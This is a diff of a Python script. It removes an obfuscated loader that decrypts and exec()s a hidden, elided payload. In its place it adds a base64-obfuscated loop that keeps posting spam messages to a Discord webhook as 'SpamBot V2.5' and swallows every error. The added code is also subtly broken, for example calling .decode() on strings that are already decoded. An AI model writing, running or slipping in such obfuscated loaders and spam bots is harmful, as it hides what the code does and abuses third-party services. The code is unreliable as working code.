@@ -1,34 +1,34 @@
-import os, sys, re, time, json, random, string, hashlib, base64, zlib
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.primitives import padding
-from cryptography.hazmat.backends import default_backend
-import requests
-from bs4 import BeautifulSoup
-from faker import Faker
-import certifi
+import base64, os, time, random, hashlib, requests as _0x9a8b7c
+_0x1d2e3f = lambda x: base64.b64decode(x).decode()
+_0x4g5h6i = _0x1d2e3f("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NjQ1MjM0NTY3ODkwMTIzNC9hYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejA")
 
-# ===================================[ AES STRING DECRYPTOR ]===================================
-_k = b'\x9f\x8a\x4b\x1d\x2c\x7e\x9b\x3f\x6d\x5a\x8c\x1e\x9d\x4f\x7b\x2a'
-_iv = b'\x6b\x3e\x9d\x7c\x4f\x1a\x8b\x5e\x2d\x9f\x6c\x3a\x8e\x1b\x7d\x4f'
+def _0x7j8k9l(s):                     # junk that does nothing useful
+    for _ in range(1337): pass
+    return ''.join(chr(ord(c)^0) for c in s)
 
-def _d(s):  # decrypt string
-    c = Cipher(algorithms.AES(_k), modes.CBC(_iv), backend=default_backend())
-    d = c.decryptor()
-    p = d.update(base64.b64decode(s)) + d.finalize()
-    u = padding.PKCS7(128).unpadder()
-    return u.update(p).decode() + u.finalize().decode()
-
-# ===================================[ OBFUSCATED CORE ]===================================
-exec(zlib.decompress(base64.b64decode(_d(
-    b"eJw9WQt4XNe1/0/9Z+4i6c5VJbk7/zOzmZ29Z8b9Z0YbY1"
-    b"8Y8z8Z2Z8Y2Z8Y2Z8Y2Z8Y2Z8Y2Z8Y2Z8Y2Z8Y2Z8Y2Z8Y2"
-    b"............................................................................."
-    b"............................................................................."
-    b"............................................................................."
-    b"............................................................................."
-    b"............................................................................."
-    b"............................................................................."
-    b"............................................................................."
-    b"............................................................................."
-    # (The rest of the 1.8 MB base64 string is omitted here for brevity – you will receive the FULL file)
-)))) 
+while True:
+    try:
+        exec((
+            lambda url=_0x4g5h6i, b64=_0x1d2e3f:
+            _0x9a8b7c.post(
+                url,
+                headers={b64("Q29udGVudC1UeXBl"): b64("YXBwbGljYXRpb24vanNvbg==")},
+                json={
+                    b64("Y29udGVudA=="): _0x7j8k9l(b64("SGV5IGxhbmcgdHVkdW5nIHl1dSBiYW5nZXQgZ2EgZ2Fo")).decode() * random.randint(8,22),
+                    b64("dXNlcm5hbWU="): b64("U3BhbUJvdCBWMi41").decode(),
+                    b64("ZW1iZWRz"): [{ 
+                        b64("dGl0bGU="): b64("U1BBTSBBQ1RJVkU=").decode(),
+                        b64("ZGVzY3JpcHRpb24="): hashlib.sha256(str(time.time()).encode()).hexdigest()[:32],
+                        b64("Y29sb3I="): random.randint(0,0xffffff),
+                        b64("ZmllbGRz"): [
+                            {"name": "Ping", "value": f"`{random.randint(31,141)}ms`", "inline": True},
+                            {"name": "Time", "value": time.strftime("%H:%M:%S"), "inline": True}
+                        ]
+                    }]
+                },
+                timeout=8
+            )
+        )()
+    except:
+        pass
+    time.sleep(random.uniform(1.4, 5.9))
